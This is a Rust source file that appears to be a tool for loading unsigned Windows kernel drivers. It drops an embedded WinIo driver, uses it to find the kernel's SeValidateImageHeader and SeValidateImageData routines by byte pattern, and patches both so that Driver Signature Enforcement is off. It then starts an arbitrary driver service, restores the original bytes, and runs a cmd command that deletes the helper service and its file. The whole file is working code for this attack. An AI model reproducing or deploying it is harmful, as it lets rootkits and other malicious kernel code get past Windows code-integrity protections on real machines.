mod driver;
mod scanner;

use std::{
    ffi::{c_char, CStr, CString},
    fs::{self, File},
    io::Write,
    process::{Command, Stdio},
    time::Instant,
};

use driver::DRIVER;
use memflow::prelude::v1::*;
use memflow_win32::prelude::v1::*;
use memflow_winio::create_connector;

use scanner::Scanner;

use log::{debug, error};
use windows::{
    core::PCSTR,
    Win32::System::Services::{
        CreateServiceA, OpenSCManagerA, StartServiceA, SC_HANDLE, SC_MANAGER_CREATE_SERVICE,
        SERVICE_ALL_ACCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER,
    },
};

// https://github.com/emlinhax/dse_hook/blob/main/dse_hook.cpp

const SE_VALIDATE_IMAGE_HEADER_PATTERN: &str =
    "?? ?? ?? ?? 89 58 08 48 89 70 10 57 48 81 EC A0 00 00 00 33 F6";
const SE_VALIDATE_IMAGE_DATA_PATTERN: &str = "?? ?? ?? ?? 48 8B 05 ?? ?? ?? ?? 4C 8B D1 48 85 C0";
/// xor rax, rax
///
/// ret
const PATCH: [u8; 4] = [0x48, 0x31, 0xC0, 0xC3];

const SEARCH_RANGE: usize = 0xFFFFFF;

/// Create and starts the service, will fail if it already exists
#[allow(clippy::missing_safety_doc)]
#[no_mangle]
pub unsafe extern "C" fn load_driver(
    name: *const c_char,
    bin_path: *const c_char,
    create_winio: bool,
) -> bool {
    let sc_manager = match OpenSCManagerA(None, None, SC_MANAGER_CREATE_SERVICE) {
        Ok(h) => h,
        Err(e) => {
            error!("{}", e);
            return false;
        }
    };

    if create_winio {
        let path = "./winio.sys";

        if let Err(e) = File::create(path).and_then(|mut f| f.write_all(&DRIVER)) {
            error!("{}", e);
            return false;
        }

        let service = get_handle(
            sc_manager,
            CString::new("WinIo").unwrap().into_raw(),
            CString::new(path).unwrap().into_raw(),
        )
        .unwrap();

        StartServiceA(service, None).unwrap();
    }

    let connector = match create_connector(&Default::default()) {
        Ok(c) => c,
        Err(e) => {
            error!("{}", e);
            return false;
        }
    };

    let mut kernel = match Win32Kernel::builder(connector)
        .build_default_caches()
        .build()
    {
        Ok(k) => k,
        Err(e) => {
            error!("{}", e);
            return false;
        }
    };

    let ntoskrnl = {
        let b = kernel.info().base;
        debug!("ntoskrnl at: {:x}", b);
        b
    };

    let se_validate_image_header =
        match find_function(&mut kernel, ntoskrnl, FunctionType::SeValidateImageHeader) {
            Some(a) => a,
            None => return false,
        };

    let se_validate_image_data =
        match find_function(&mut kernel, ntoskrnl, FunctionType::SeValidateImageData) {
            Some(a) => a,
            None => return false,
        };

    let service = match get_handle(sc_manager, name, bin_path) {
        Some(s) => {
            debug!("Successfully opened handle to driver");
            s
        }
        None => {
            error!("Failed to open handle to driver");
            return false;
        }
    };

    let original_bytes = match (
        kernel.read_raw(se_validate_image_header, 4),
        kernel.read_raw(se_validate_image_data, 4),
    ) {
        (Ok(header), Ok(data)) => (header, data),
        _ => return false,
    };

    // patch dse
    if let Err(e) = kernel.write_raw(se_validate_image_header, &PATCH) {
        error!("{}", e);
        return false;
    }

    if let Err(e) = kernel.write_raw(se_validate_image_data, &PATCH) {
        error!("{}", e);
        return false;
    }

    debug!("patched dse");

    // start driver
    let status = { StartServiceA(service, None) }.is_ok();

    // restore dse
    if let Err(e) = kernel.write_raw(se_validate_image_header, &original_bytes.0) {
        error!("{}", e);
        return false;
    }

    if let Err(e) = kernel.write_raw(se_validate_image_data, &original_bytes.1) {
        error!("{}", e);
        return false;
    }

    debug!("restored dse");

    if create_winio {
        if let Err(e) = Command::new("cmd")
            .arg("/C")
            .arg("timeout /t 10 >nul && sc stop WinIo && sc delete WinIo && del winio.sys")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
        {
            error!("{}", e);
            return false;
        }
    }

    status
}

unsafe fn get_handle(
    sc_manager: SC_HANDLE,
    name: *const c_char,
    mut path: *const c_char,
) -> Option<SC_HANDLE> {
    path = fs::canonicalize(CStr::from_ptr(path).to_str().ok()?)
        .ok()?
        .to_string_lossy()
        .strip_prefix(r"\\?\")?
        .as_ptr() as *const i8;

    match CreateServiceA(
        sc_manager,
        PCSTR::from_raw(name as *const u8),
        PCSTR::from_raw(name as *const u8),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        PCSTR::from_raw(path as *const u8),
        None,
        None,
        None,
        None,
        None,
    ) {
        Ok(h) => Some(h),
        Err(_) => None,
    }
}

fn find_function<T: MemoryView>(
    kernel: &mut T,
    ntoskrnl_base: Address,
    function_type: FunctionType,
) -> Option<Address> {
    let start = Instant::now();

    let pattern = match function_type {
        FunctionType::SeValidateImageHeader => SE_VALIDATE_IMAGE_HEADER_PATTERN,
        FunctionType::SeValidateImageData => SE_VALIDATE_IMAGE_DATA_PATTERN,
    };

    match Scanner::find_pattern(kernel, ntoskrnl_base, SEARCH_RANGE, pattern) {
        Some(a) => {
            debug!(
                "Found {:?}, in {:?}, at: {}",
                function_type,
                start.elapsed(),
                a
            );
            Some(a)
        }
        None => {
            debug!("Failed to find {:?}", function_type);
            None
        }
    }
}

#[derive(Debug)]
enum FunctionType {
    SeValidateImageHeader,
    SeValidateImageData,
}
